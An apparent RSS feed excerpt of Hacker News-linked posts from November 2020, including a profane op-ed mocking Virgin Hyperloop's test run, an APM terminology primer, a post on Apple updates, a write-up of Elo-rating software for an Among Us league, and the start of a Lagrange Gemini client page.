<![CDATA[Virgin Hyperloop Has Invented the World's Crappiest High-Speed Rail]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 53 (<a href="https://news.ycombinator.com/item?id=25090938">thread link</a>) | @Osiris30
<br/>
November 14, 2020 | https://defector.com/virgin-hyperloop-has-invented-the-worlds-crappiest-high-speed-rail/ | <a href="https://web.archive.org/web/*/https://defector.com/virgin-hyperloop-has-invented-the-worlds-crappiest-high-speed-rail/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div id="pico">
<p>Shocking news! In an incredible breakthrough for American mass-transit engineering, the transportation technology company Virgin Hyperloop this past weekend successfully moved two people 500 meters across the barren Las Vegas desert at a top speed of just over 100 mph, setting a new world record for the absolute most pitiful thing anyone not named “Elon Musk” has ever tried to pass off as “high-speed rail.”</p>



<p>Here’s video of the shameful display:</p>



<figure><p>
<iframe title="Watch people travel in Virgin Hyperloop for the first time" width="500" height="281" src="https://www.youtube.com/embed/AZruVz3Ccjk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>Virgin Hyperloop, an American company despite the Richard Branson branding, proposes to use a combination of magnetic levitation, or “maglev”—a decades-old technology that has been in commercial operation moving real trains filled with real people in, for example, Shanghai, China, at speeds up to 268 miles per hour, for <em>17 goddamn years</em>—and “vactrain,” a concept design for an enclosed, artificially evacuated tunnel where air resistance may be as low as in the upper parts of Earth’s atmosphere, theoretically allowing for much higher top speeds at much lower levels of energy consumption. It is so goddamn embarrassing to type this. France’s electric TGV system has been in regular commercial operation for nearly 40 years; in April of 2007 one of its trains hit 357 miles per hour in a test.</p>



<p><a href="https://www.cnn.com/2020/11/08/tech/virgin-hyperloop-passengers/index.html">CNN’s article about this event</a> paraphrases a Virgin Hyperloop executive claiming that the hyperloop pods “can travel at the speed of aircraft.” Which is true, in the sense that commercial aircraft with dozens if not hundreds of people aboard do sometimes travel at 100 miles per hour, on the ground, for seconds at a time, during takeoff or landing, when they are going only a fraction as fast as they’re capable of going. It is also true in the sense that, strictly speaking, a paper airplane is a form of “aircraft,” and you can really whip some of those suckers across a room. A more accurate but perhaps less flattering claim would be that my Honda Odyssey can travel at the fastest speed Virgin Hyperloop has yet attained, and with <em>four times as many people riding in it</em>.</p>



<p>Hell, for that matter, as <a href="https://twitter.com/leftistthot420/status/1326561247333134336">a Twitter user</a> helpfully pointed out, <a href="https://en.wikipedia.org/wiki/LNER_Class_A4_4468_Mallard">a freaking <em>steam locomotive</em> hit 126 miles per hour</a> in England, 82 years ago, in 1938.</p>



<p><em>Yeah, but, when it’s done, it’ll go 600 miles per hour</em>, you’re whining, <em>and it’ll have 25 to 30 people in a pod!</em> When exactly will that be? France opened the TGV in 1981. Japan’s oldest high-speed line debuted in 1964—<em>1964!</em>—and was better and faster then than Amtrak’s Acela trains go now. Shanghai’s maglev train has been operable since John Kerry was campaigning to unseat George W. Bush as president. Measure speed by the number of riders the respective services will have moved by, say, 2050. Measure it in carbon emissions. By the year 2020, the best-funded and most sophisticated high-speed rail developer in the United States moved two (2) people 500 meters.</p>



<p>The United States is generations behind much of the rest of the wealthy, industrialized world in this area. For all but a very narrow corridor along the East Coast serviced by the weak half-a-loaf shit that passes for high-speed rail in this country, the best an American commuter can hope for in intercity rail options are crappy and ancient diesel Amtrak trains that top out at around 80 miles per hour. Most American cities simply are not serviced by any intercity rail network at all. The U.S.’s shameful mass-transit situation—and thus its shameful dependence on personal vehicles, and all the downstream bad shit that comes from that—could be improved a zillion percent by just aiming for the level of railroad sophistication French people considered normal before the median 2020 French person was old enough to ride a bicycle. And here are these Professor Frink–ass Hyperloop dinguses, dumping resources beyond counting into inventing some shit that already exists when for a fraction of the cost and in a fraction of the time they could just <em>purchase</em> or at the very least <em>copy</em> what is already working just fine even in backward-ass doofus countries like freaking Italy. It wouldn’t need test tracks! It wouldn’t need years of iteration and development! They already did all that shit, all over the rest of the world! </p>



<p>In a vacuum (a figurative one: an alternate universe in which the rest of the post-industrial world were not absolutely goddamn <em>bursting</em> with operating networks of authentic high-speed rail; where high-speed rail were not already such a well-developed form of transit that the TGV system, which routinely moves huge numbers of day-to-day commuters across large distances of France at speeds well more than twice that achieved by this sad two-person billion-dollar pod going from nowhere to nowhere across a tiny patch of worthless desert, were not both infinitely better and more sophisticated than any presently available commercial rail in the United States <em>and</em> fairly outmoded in comparison to newer [yet still not all that new!] systems in China and Japan and elsewhere) the Virgin Hyperloop could almost look like an impressive accomplishment. Alas, here in the world of context, its only real accomplishment is a promotional one. The business of the American technology sector and its attendant courtier press is to continually recreate and exploit something like a vacuum in the public’s awareness of what the larger world is like, so that clueless observers will congratulate a bunch of boobs for “inventing” a shittier, more expensive version of something that is already regarded as boring and normal—fast, energy-efficient rail service!—pretty much everywhere outside of this stupid and embarrassing country.</p>



<p>Everything about the broken incentives and hollowed-out capacities of American society is crystallized in this dumb pod moseying its way along a track to nowhere in Las Vegas. The United States has a problem: It is too dependent on inefficient, dirty, and expensive forms of transportation, because the vast majority of its people have no practical access to other kinds. Its infrastructure and the health of its communities are all jacked up by the necessity of splattering asphalt all over everything in order for people to drive their big dumb cars to, and park them near, anywhere they’d decide to go. It cannot achieve efficient levels of density or make meaningful turns toward environmental responsibility for as long as this is the case. Thankfully, a solution to this problem already exists and is in operation throughout other parts of the world with comparable levels of wealth and technological capacity: Trains! Networks of fast-moving trains that do not need internal combustion engines in order to move lots of people very quickly along their tracks! Companies and agencies make and install and operate these train systems, and have been doing so for a long time, longer even than the lifetime of the graybeard crap-bag writing this blog. They know how to do it! They can probably just be hired to do it. At some level somebody can probably just buy some of those trains, and install them, and turn them on, and take people from here to there on them.</p>



<p>But who could make it happen? Broke-dick, systematically impoverished municipalities, lashed to budget-balancing like a cinderblock tied to their feet? Close your eyes and try to imagine how a sane and obviously good decision like <em>Just import the TGV and run it between the big American cities instead of spending years and fortunes inventing maglev from scratch for no reason</em> could get made in these United States. Imagine who’d make it, and what their goals would be, and where the money would come from. It simply can’t get made on those terms. It can’t get made at all. No level of American society even has a mechanism for that anymore. If it doesn’t require a messianic assbrain with a Steve Jobs cosplay fantasy pitching some sleepy billionaire or venture capital firm on the possibility of cornering the market on a brand-new technology that will conquer the world, then it will not get done. If it merely delivers a profound benefit to the common good rather than the promise of extravagant enrichment to a shrinking class of hyper-powered parasites, then it simply cannot exist.</p>




</div></div></div></div></div>]]>
            </description>
            <link>https://defector.com/virgin-hyperloop-has-invented-the-worlds-crappiest-high-speed-rail/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25090938</guid>
            <pubDate>Sat, 14 Nov 2020 08:03:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[APM 101: Terminology and Concepts]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25090928">thread link</a>) | @xxlcloudinc
<br/>
November 14, 2020 | https://codecoda.com/en/blog/entry/apm-101-terminology-and-concepts | <a href="https://web.archive.org/web/*/https://codecoda.com/en/blog/entry/apm-101-terminology-and-concepts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="description">
<p>Today, we are going to take a look at <em>Application Performance Management 101</em>, its terminology, and its concepts. APM is incredibly essential for systems today, but many organizations still aren’t using it to its fullest effect.</p>
<p>Organizations need APM to remain in control of their network and infrastructure. However, they may not be able to effectively set up APM if they underestimate its importance and magnitude of their effect. Because of this, everyone needs an in-depth understanding of APM, why it matters in application development, and what are some of the best ways to manage and monitor it. </p>
<h2>What is APM?</h2>
<div><p>Let’s take a closer look at <a href="https://lightstep.com/apm" target="_blank" rel="nofollow">APM</a>. Application Performance Management is a method that organizations use to track the performance of their applications <em>discreetly</em>, identifying those that malfunction or misbehave - forwarding bad requests, being slow on request-response, and so on. Every issue within an application should be exposed through application performance management, such as suspicious amounts of traffic going in and out, memory leaks or resource overload.</p><p>APM is something that <em>every</em> system needs today.</p><p>In the past, APM wasn’t that important, because each application could be managed on its own. A systems administrator might notice that a single application was being sluggish and would pull it and reboot it. But today, applications come in hundreds or thousands within a single system. Distributed computing, <strong><a href="https://codecoda.com/en/blog/entry/what-are-microservices">microservices architecture</a></strong>, virtualization, and containerization have all made applications work on multiple levels of a network organization. And each of these networks has independent maintenance and monitoring.<br>APM consolidates all of this into a singular system that makes it possible to identify issues with practically any application. It also means that the system must be working well as a standalone entity, be consistent and coherent, and track all applications through distributed tracing processes. This requirement can present a challenge, especially for organizations that are setting up their APM or tracing after the fact.</p></div>
<h2>Key features of APM</h2>
<p>There are many APM solutions out there. Some of them are relatively light and stripped down, while others are robust. A small organization could benefit from a lightweight APM solution, while a large enterprise needs a heavyweight APM solution with an extensive set of complementary features. Regardless of what a custom project might require specifically, APM key feature usually doesn’t change.</p>
<ul>
<li><strong>Performance of web requests</strong>. Most solutions today are cloud-based and web-based. APM will track the performance of web requests to determine whether some of them are lagging or whether the performance could otherwise improve. Every transaction is traced so that the organization can readily address pressing issues.</li>
<li><strong>Code-level performance profiling</strong>. APM can identify which methods within the code-level of an application could be slowing down a system. Applications today are growing more complex in and out of themselves, and therefore this type of maintenance becomes exceptionally important.</li>
<li><strong>Application dependencies</strong>. It may not be the application that is working incorrectly but one of its dependencies. As an example, the system might be tracking whether the application’s SQL queries are running slowly.</li>
<li><strong>Server monitoring metrics</strong>. Many people are familiar with the task manager; APM solutions will determine how the application is running in terms of CPU usage, memory usage, and more. This is very basic but can provide fast key insights.</li>
<li><strong>Log data</strong>. APM will take and manage a significant amount of log data, which can then be searched through, monitored, or analyzed. Some APM solutions will even export log data so other systems can analyze it.</li>
<li><strong>Errors management</strong>. One of the most essential systems, APM will also identify errors. A robust system will prioritize these errors so that it becomes clearer which errors must be addressed and when.</li>
<li><strong>User monitoring</strong>. In addition to the applications themselves, APM solutions will also identify what users are doing and how they interact with applications. APM solutions should always be geared toward the user; making sure the applications deliver what they need to deliver to the user.</li>
</ul>
<p>Like other advanced systems, APM solutions can usually be extended. When they are extended, they are integrated with other solutions, or given add-ons to their existing solutions. But APM solutions as a whole are always going to include the above feature sets.</p>
<h2>APM terminology</h2>
<p>APM terminology had grown significantly since 2013 when an APM boom was encountered. Before <strong><a href="https://codecoda.com/en/tech-expertise/cloud-solutions">cloud services</a></strong>, microservices, and other architecture changes, APM really wasn’t as necessary as it is today. But as the industry grows, it also becomes more complex. And as it becomes more complex, there become specific terms that need to be used.</p>
<ul>
<li><strong>Distributed tracing</strong>. This is a method by which tracing is performed end-to-end throughout applications, to ensure that the requests can be traced back to any issue that occurred. Distributed tracing is an incredibly important factor in APM but it shouldn’t be confused with APM itself, just as observability should not be confused with monitoring.</li>
<li><strong>Tracing</strong>. Tracing is what tracks requests throughout a system. It’s important because without it - a request can enter into a system incorrectly. The fault may occur within an application, but a previous interaction could have passed on flawed data. Without tracing, you could determine where the fault is, but not where it originated, and a single microservice could be sending faulty requests throughout the whole system.</li>
<li><strong>Monitoring</strong>. Monitoring identifies issues as they occur and reports them back. Tracing, management, analytics, and more, is what provides the data. But the monitoring system alerts the organization when issues have occurred, and it’s one of the most important aspects of any APM solution. Without robust enough monitoring, the system may identify faults, but most would remain unaddressed.</li>
<li><strong>Tags</strong>. Tags make it easier to trace things throughout the system by attaching important, and sometimes critical, information. Tags within an APM system make it far easier to track important issues.</li>
<li><strong>Filters</strong>. Filtering and searching through APM logs makes it easier to reach critical information. APM logs provide analytical data, such as performance issues that could remain hidden because they are not yet critical.</li>
<li><strong>Services</strong>. Services are the core building blocks of a system, which make it possible to build an application. Services are incredibly important today because of microservices, which are often used throughout application architecture, and which need to be traceable in and of themselves.</li>
<li><strong>Resources</strong>. Resources can refer to the domains within a customer application, including background jobs, database queries, web endpoints, and other accessible and discrete units. Resources are used by applications and may have their own errors or performance issues.</li>
</ul>
<p>Understanding the above terms can make the process of understanding APM much easier. But APM is a discipline in itself, and organizations that are interested in improving their capacity for robust APM should consider getting the help of a managed partner.</p>
<h2>APM concepts</h2>
<p>What are the core APM concepts? What is it that makes APM so important? In general, the core APM concepts are: </p>
<ul>
<li><strong>Observability</strong>. It is important that <em>everyone</em> knows where things have gone wrong within a system. In addition to knowing where systems have gone wrong, it’s important to know the general status of the system as well.</li>
<li><strong>Continuity</strong>. End-to-end tracing is incredibly important because otherwise, it’s not always clear where an error occurred. Greater levels of continuity are growing in importance, along with systems becoming larger and more complex.</li>
<li><strong>Prioritization</strong>. It’s important that an organization be able to prioritize its systems. High-level errors need to follow different channels than lower-level errors, or IT will have a hard time addressing them properly.</li>
<li><strong>Scalability</strong>. As more applications are added, it’s vital that the system be able to adjust without any issues. Otherwise, the system is going to need to be modified every time new applications are introduced, which can be quite frequently.</li>
</ul>
<p>Overall, APM is all about ensuring that the organization maintains control over its application performance monitoring. If it is not able to do so, the system itself becomes fragile and prone to malfunction.</p>
<h2>APM best practices</h2>
<p>What are some of the best APM practices? It all has to do, of course, with the systems and suites. There are many APM technologies today, and they’re continually growing. But when it comes to the best methods with APM, there are several things everyone should agree on:</p>
<ul>
<li><strong>Consistency and standardization</strong>. Application names, tracing, reporting, and more, should all be standardized so that it’s easier to trace them back.</li>
<li><strong>Unique identifiers</strong>. All events that are handled through applications should have unique identifiers no matter where they are within the system so that they can be traced back. </li>
<li><strong>Prioritization</strong>. As mentioned above, prioritization is a key concept. Different applications should be prioritized based on how essential they are to the system.</li>
<li><strong>Logging</strong>. Robust logs are key to APM and distributed tracing, and ideally, they should be ready for search, analysis, and customization</li>
</ul>
<p>With the above best practices, organizations can get started with their application performance monitoring. But the more complex the network, the more complicated their APM too. It’s important for organizations to always keep an eye on structural improvements and try out the newest APM technologies as they emerge. Now that containerization, docker services, and microservices architecture are here to stay, it will become increasingly more difficult to track errors across an entire system.</p>
</div></div>]]>
            </description>
            <link>https://codecoda.com/en/blog/entry/apm-101-terminology-and-concepts</link>
            <guid isPermaLink="false">hacker-news-small-sites-25090928</guid>
            <pubDate>Sat, 14 Nov 2020 08:01:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple and Updates for the Sake of Updates]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25090825">thread link</a>) | @KlimYadrintsev
<br/>
November 13, 2020 | https://klimy.co/blog/updates-for-the-sake-of-updates-14-11-2020 | <a href="https://web.archive.org/web/*/https://klimy.co/blog/updates-for-the-sake-of-updates-14-11-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="blog">
                    <h2>Information and its abundance</h2>
<p>There has been a strange world in the post generations of iPhone. Some updates didn’t change a thing from the user perspective.</p>
<p>Both in hardware, software and design. The updates that basically either forced you to buy a new phone or updates that were talked about as revolutionary didn’t do anything.</p>
<p>That is a crazy thing to think about. We live in a world of constant information overdrive. There is just too much information for us to waste our time looking and investing in something sub-par.</p>
<p>There has been a concept that the most successful writers and content creator have been using to get the best reach and get the biggest impact from their content.</p>
<p>It was to make the best content that is different from the mass. Make it so that people are eager to get more content from you with your personal style embedded.</p>
<h2>Apple disappointing</h2>
<p>Apple has been putting out content in each of their conferences that didn’t really move anyone it seems.</p>
<p>Yes, it is something new, but it is not something completely new like the iPad or iPhone or iPod was. There is nothing revolutionary coming any more.</p>
<p><img alt="iPhone one 1" src="https://i.gyazo.com/af09e6e1c58052507af91c5dcedaebbc.jpg"></p>
<p>There can be 3 reasons for this in my opinion:</p>
<ol>
<li>Most of the upgrades these days is switching old, manual algorithm that hard-coded behaviour and responses are being switched to faster and more advanced and flexible machine learning and neural networks algorithms. So, the most significant change for the iPhone is happening under the hood, which is not really seen until Apple can do some really crazy stuff after everything is integrated.</li>
<li>The death of Steve Jobs has been too big of a blow on the creative and time side. He propelled people into new gadgets and forced deadlines. He was the most passionate person in making money and creating something so huge and amazing that everyone would want it.</li>
<li>There is a technological limit being hit. The biggest thing these days with all the hardware manufacturers is that their progress is about to slow down as there is not enough technology to make their products faster and quieter and smaller. NVidia is using machine learning to boost their graphics cards. AMD has had to resort to neural networks to boost their performance. Intel has been stuck with the same idea of improving their product from 2000.</li>
</ol>
<p>All of this is either very exciting or very disappointing. </p>
<p>It means that maybe, just maybe, there is a huge technological breakthrough coming in the couple of years that will bring the whole industry upside down.</p>
<p>Or it means that we have hit a plateau in the technology field and their technology will be more of a tool to work on other components of life, rather than being the biggest focus.</p>
<p>I am not sure what it is, but I see that our life will be very different from what it is right now in 10 years. Not even taking coronavirus into account.</p>
<h2>Technology</h2>
<p>As we know, technology is like a weapon that can either make you a villain if misused or a hero if used correctly.</p>
<p>Technology is just like that. You can either destroy your life by being a slave to social media and other forms of time wasters. Or you can elevate yourself to the next level by creating, learning, and researching with it.</p>
<p>What matters the most to the normal human being is not what you have, but how you use it.</p>
<p>It doesn’t matter if it’s iPhone 12 or iPhone 24. What matters is what you do with it.</p>
<p>Like with everything, you need to work your way from the bottom:</p>
<p>Start now. Get perfect later.</p>
<p>Klim Y</p> 
                    
                </div></div>]]>
            </description>
            <link>https://klimy.co/blog/updates-for-the-sake-of-updates-14-11-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-25090825</guid>
            <pubDate>Sat, 14 Nov 2020 07:30:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing Software for an Among Us League]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25090821">thread link</a>) | @keskadale
<br/>
November 13, 2020 | https://healeycodes.com/writing-software-for-an-among-us-league/ | <a href="https://web.archive.org/web/*/https://healeycodes.com/writing-software-for-an-among-us-league/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Lately, I’ve been playing a lot of <a href="https://en.wikipedia.org/wiki/Among_Us">Among Us</a> with my friends. It’s a refreshing change of pace from the competitive FPS titles that we usually play. However, we’ve managed to inject a ‘healthy’ dose of competitiveness into our games in the form of a league that I built some software for. </p>
<p>We recently crossed the 100 game mark and players have been making feature requests and also submitting PRs! It has been open sourced at <a href="https://github.com/healeycodes/among-us-friends">healeycodes/among-us-friends</a>.</p>
<p>The league website is a Node/Express application that calculates a player’s <a href="https://en.wikipedia.org/wiki/Elo_rating_system">Elo rating</a> — a relative measure of one player’s skill against another — as well as other performance statistics like crew/imposter win rate. It ranks players and graphs their recent performance on the home page. </p>
<p><span>
      <a href="https://healeycodes.com/static/a9004cf01205c12f8f4532e6833d8e63/f5f2a/preview.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="The home page - a list of players, their win/loss rate, and Elo charts" title="The home page - a list of players, their win/loss rate, and Elo charts" src="https://healeycodes.com/static/a9004cf01205c12f8f4532e6833d8e63/f5f2a/preview.png" srcset="https://healeycodes.com/static/a9004cf01205c12f8f4532e6833d8e63/a8a0d/preview.png 300w,
https://healeycodes.com/static/a9004cf01205c12f8f4532e6833d8e63/dface/preview.png 600w,
https://healeycodes.com/static/a9004cf01205c12f8f4532e6833d8e63/f5f2a/preview.png 695w" sizes="(max-width: 695px) 100vw, 695px" loading="lazy">
  </a>
    </span></p>
<p>When a player goes to their auto-generated player page, they can see a history of their games and who played on each side, the amount of Elo they won or lost each game, and an Elo history graph for the whole season.</p>
<p><span>
      <a href="https://healeycodes.com/static/b9b2a7db52b7a621dcd9dafadeb91166/3ffe4/preview-player.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="A player's page - a longer Elo history chart, game history, Elo change amounts" title="A player's page - a longer Elo history chart, game history, Elo change amounts" src="https://healeycodes.com/static/b9b2a7db52b7a621dcd9dafadeb91166/3ffe4/preview-player.png" srcset="https://healeycodes.com/static/b9b2a7db52b7a621dcd9dafadeb91166/a8a0d/preview-player.png 300w,
https://healeycodes.com/static/b9b2a7db52b7a621dcd9dafadeb91166/dface/preview-player.png 600w,
https://healeycodes.com/static/b9b2a7db52b7a621dcd9dafadeb91166/3ffe4/preview-player.png 646w" sizes="(max-width: 646px) 100vw, 646px" loading="lazy">
  </a>
    </span></p>
<p>I manually track each game we play in a Google Sheets spreadsheet. This data is brought into the application via the Google Sheets API v4. To set this up, I grabbed the spreadsheets ID (which can be copied straight from the URL bar) and created a restricted API key via Google Console.</p>
<p>The data arrives in a series of rows with each row representing one game. An Among Us game can be split up into three parts of data. </p>
<ul>
<li>The crew (7 or 8 players)</li>
<li>The imposters (2 players)</li>
<li>The winner (crew or imposters)</li>
</ul>
<p>Since a spreadsheet cannot be efficiently queried, and page requests are unlikely to exceed 0.15/s, and the amount of data will grow linearly, we bring in all the rows on every request (Sheets API usage is unlimited and free).</p>
<p>There is a performance cost to recalculating the statistics but this can be solved in the future with caching. The performance cost for each additional game is a constant amount so, loosely, we could say that the cost of generating league statistics grows at the same rate as additional games. It has a time complexity of <code>O(n)</code>.</p>
<p>A player object is built for each person in the league and the following information is calculated.</p>
<ul>
<li>Crew wins/losses</li>
<li>Imposter wins/losses</li>
<li>Current Elo</li>
<li>Elo history</li>
<li>Their game history</li>
</ul>
<h2 id="elo-ratings"><a href="#elo-ratings" aria-label="elo ratings permalink"></a>Elo ratings</h2>
<p>For Elo calculations, I use the npm package <code>elo-rating</code>. In the Elo rating methodology, the <em>K-factor</em> is the maximum possible adjustment for a game. I have based the league’s system off the International Chess Federation’s rules. Before a player reaches 30 games, their rating is more volatile. After 30 games, their K-factor drops from 40 to 20.</p>
<p>Elo was designed for games with two players. I was initially unsure how to solve the problem of Among Us having different team sizes. Other people have created rating systems for Among Us that separate a measure of a player’s skill into crew/imposter. However, I made a product decision to reduce a player’s performance down to a single number. As a result, a player is compared against the average Elo of the side they are playing against.</p>
<p>We alter our game settings (e.g. crew vision, kill cooldown) over time to encourage a 50/50 win rate of crew and imposter teams. Even if the win rate is skewed, the effects on a player’s general rating will even out in the long run because players will have a similar number of games on each side (20% imposter, 80% crew).</p>
<p>Elo systems in video games are not tuned to be mathematically perfect but to reward and encourage players — a mixture of fun and correctness. Read more about this topic in <a href="http://sirlingames.squarespace.com/blog/2010/7/24/analyzing-starcraft-2s-ranking-system.html">Analyzing Starcraft 2’s Ranking System</a> by Sirlin.</p>
<div data-language="javascript"><pre><code><span>const</span> EloRating <span>=</span> <span>require</span><span>(</span><span>"elo-rating"</span><span>)</span><span>;</span>

<span>function</span> <span>EloChange</span><span>(</span><span>games</span><span>)</span> <span>{</span>
  
  
  
  <span>const</span> <span>K</span> <span>=</span> games <span>&gt;</span> <span>30</span> <span>?</span> <span>20</span> <span>:</span> <span>40</span><span>;</span>
  
  <span>return</span> <span>function</span> <span>(</span><span>playerA<span>,</span> playerB</span><span>)</span> <span>{</span>
    <span>return</span> <span>[</span>
      EloRating<span>.</span><span>calculate</span><span>(</span>playerA<span>,</span> playerB<span>,</span> <span>true</span><span>,</span> <span>K</span><span>)</span><span>.</span>playerRating <span>-</span> playerA<span>,</span>
      EloRating<span>.</span><span>calculate</span><span>(</span>playerA<span>,</span> playerB<span>,</span> <span>false</span><span>,</span> <span>K</span><span>)</span><span>.</span>playerRating <span>-</span> playerA
    <span>]</span><span>;</span>
  <span>}</span><span>;</span>
<span>}</span>



<span>let</span> eloChange <span>=</span> <span>EloChange</span><span>(</span><span>0</span><span>)</span><span>;</span>
<span>expect</span><span>(</span><span>eloChange</span><span>(</span><span>1200</span><span>,</span> <span>1400</span><span>)</span><span>[</span><span>0</span><span>]</span><span>)</span><span>.</span><span>toStrictEqual</span><span>(</span><span>30</span><span>)</span><span>;</span>
<span>expect</span><span>(</span><span>eloChange</span><span>(</span><span>1200</span><span>,</span> <span>1400</span><span>)</span><span>[</span><span>1</span><span>]</span><span>)</span><span>.</span><span>toStrictEqual</span><span>(</span><span>-</span><span>9</span><span>)</span><span>;</span>

eloChange <span>=</span> <span>EloChange</span><span>(</span><span>31</span><span>)</span><span>;</span>
<span>expect</span><span>(</span><span>eloChange</span><span>(</span><span>1400</span><span>,</span> <span>1200</span><span>)</span><span>[</span><span>0</span><span>]</span><span>)</span><span>.</span><span>toStrictEqual</span><span>(</span><span>4</span><span>)</span><span>;</span>
<span>expect</span><span>(</span><span>eloChange</span><span>(</span><span>1400</span><span>,</span> <span>1200</span><span>)</span><span>[</span><span>1</span><span>]</span><span>)</span><span>.</span><span>toStrictEqual</span><span>(</span><span>-</span><span>15</span><span>)</span><span>;</span></code></pre></div>
<p>The backend of the application is tested using Jest, and SuperTest for mocking requests to the server. The statistic functions are unittested. All the tests are ran on commit/PR using GitHub Actions with the default Node YAML file that runs the following commands across the three latest versions of Node.</p>
<div data-language="yaml"><pre><code>    <span>-</span> <span>run</span><span>:</span> npm ci
    <span>-</span> <span>run</span><span>:</span> npm run build <span>-</span><span>-</span>if<span>-</span>present
    <span>-</span> <span>run</span><span>:</span> npm test</code></pre></div>
<h2 id="charts-and-pages"><a href="#charts-and-pages" aria-label="charts and pages permalink"></a>Charts and pages</h2>
<p>For the line graphs that chart player ratings, I use Chart.js. There is a shared graph function for the home page and the player page. It takes an array of Elo history and a <code>sample</code> argument which allows the home page to show the last 30 games and the player pages to show all of the season’s games.</p>
<p>The home page generates a list of players and their graphs after hitting an endpoint of the application that sends back a blob of statistics. In the future, depending on the size of the player base, this will need to allow querying specific players. For now, the page load cost of this is imperceivable (i.e. sub-100ms).</p>
<div data-language="javascript"><pre><code><span>fetch</span><span>(</span><span>"/stats"</span><span>)</span>
  <span>.</span><span>then</span><span>(</span><span>response</span> <span>=&gt;</span> response<span>.</span><span>json</span><span>(</span><span>)</span><span>)</span>
  <span>.</span><span>then</span><span>(</span><span>json</span> <span>=&gt;</span> <span>{</span>
    
    statsList<span>.</span>firstElementChild<span>.</span><span>remove</span><span>(</span><span>)</span><span>;</span>
    </code></pre></div>
<p>All pages use a similar pattern of serving a HTML page that contains a loading message that is removed when the data is fetched and the rest of the page is built. There is no framework and the JavaScript is unprocessed.</p>
<h2 id="deployment"><a href="#deployment" aria-label="deployment permalink"></a>Deployment</h2>
<p>I manually deploy and maintain the application via Glitch. I import the latest changes from the default GitHub branch and any changes to the <code>package.json</code> file are reconciled. This means there is ~20 seconds of downtime. The Glitch IDE allows for hotfixing in production (or even development), as well as viewing application logs, and a terminal window that connects to an SSH session.</p>
<p><span>
      <a href="https://healeycodes.com/static/bd14fad80858eb105a2c009cc2a90f2b/8498c/glitch.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Glitch IDE, log tab, and terminal tag" title="Glitch IDE, log tab, and terminal tag" src="https://healeycodes.com/static/bd14fad80858eb105a2c009cc2a90f2b/8498c/glitch.png" srcset="https://healeycodes.com/static/bd14fad80858eb105a2c009cc2a90f2b/a8a0d/glitch.png 300w,
https://healeycodes.com/static/bd14fad80858eb105a2c009cc2a90f2b/dface/glitch.png 600w,
https://healeycodes.com/static/bd14fad80858eb105a2c009cc2a90f2b/8498c/glitch.png 645w" sizes="(max-width: 645px) 100vw, 645px" loading="lazy">
  </a>
    </span></p>
<p>I started this project by coding directly in Glitch’s browser IDE which can export to a GitHub repository’s <code>glitch</code> branch where PRs can be created. After a while, I took development offline when users started visiting the website more often.</p>
<p>My current workflow is: develop locally, check tests locally, create PR, check the CI tests, merge to main, go to Glitch, and import from GitHub.</p>
<p>I also added a route <code>/raw-stats</code> so that myself and other developers can work with read-only production data when we work locally.</p>
<h2 id="feedback"><a href="#feedback" aria-label="feedback permalink"></a>Feedback</h2>
<p>Like most online games that have rating systems, there have been comments about the fairness of the rating system. As of writing, the key unsolved problem is that the player’s team is not taken into account (only the opposing team’s rating is used). If you are paired with new players, or very experienced players, the probability of you winning a game is altered but not captured in the Elo calculations.</p>
<p>A player on a strong team should be rewarded less for their win and vice versa. The change required to implement this is to ‘walk’ the player’s Elo towards the average of their team before determining their rating change after a game.</p></section></div>]]>
            </description>
            <link>https://healeycodes.com/writing-software-for-an-among-us-league/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25090821</guid>
            <pubDate>Sat, 14 Nov 2020 07:28:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[3D printers fill the air with volatile nanoparticles. More research is needed [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25090795">thread link</a>) | @giuliomagnifico
<br/>
November 13, 2020 | https://www.bfr.bund.de/cm/349/3d-printing-a-dusty-business.pdf | <a href="https://web.archive.org/web/*/https://www.bfr.bund.de/cm/349/3d-printing-a-dusty-business.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.bfr.bund.de/cm/349/3d-printing-a-dusty-business.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25090795</guid>
            <pubDate>Sat, 14 Nov 2020 07:20:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Lagrange – A Beautiful Gemini & Gopher Client]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25090565">thread link</a>) | @davewongillies
<br/>
November 13, 2020 | https://gmi.skyjake.fi/lagrange/ | <a href="https://web.archive.org/web/*/https://gmi.skyjake.fi/lagrange/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="container">



<p>Lagrange is a desktop GUI client for browsing Geminispace. It offers modern conveniences familiar from web browsers, such as smooth scrolling, inline image viewing, multiple tabs, visual themes, Unicode fonts, bookmarks, history, and page outlines.</p>

<p>Like Gemini, Lagrange has been designed with minimalism in mind. It depends on a small number of essential libraries. It is written in C and uses SDL for hardware-accelerated graphics. OpenSSL is used for secure communications.</p>

